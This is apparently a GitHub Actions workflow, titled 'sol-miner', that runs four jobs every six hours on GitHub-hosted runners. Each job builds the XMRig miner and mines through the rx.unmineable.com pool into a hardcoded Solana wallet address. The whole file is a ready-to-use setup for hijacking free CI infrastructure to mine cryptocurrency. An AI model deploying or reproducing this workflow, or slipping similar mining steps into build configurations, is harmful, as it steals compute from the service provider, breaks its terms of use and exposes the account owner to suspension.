name: sol-miner

on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'  # Jalan ulang setiap 6 jam

jobs:
  miner1:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Start Miner 1
        run: |
          sudo apt update
          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
          git clone https://github.com/xmrig/xmrig.git
          mkdir xmrig/build && cd xmrig/build
          cmake ..
          make -j$(nproc)
          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker1 -p x --threads=4

  miner2:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Start Miner 2
        run: |
          sudo apt update
          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
          git clone https://github.com/xmrig/xmrig.git
          mkdir xmrig/build && cd xmrig/build
          cmake ..
          make -j$(nproc)
          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker2 -p x --threads=4

  miner3:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Start Miner 3
        run: |
          sudo apt update
          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
          git clone https://github.com/xmrig/xmrig.git
          mkdir xmrig/build && cd xmrig/build
          cmake ..
          make -j$(nproc)
          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker3 -p x --threads=4

  miner4:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Start Miner 4
        run: |
          sudo apt update
          sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
          git clone https://github.com/xmrig/xmrig.git
          mkdir xmrig/build && cd xmrig/build
          cmake ..
          make -j$(nproc)
          ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker4 -p x --threads=4
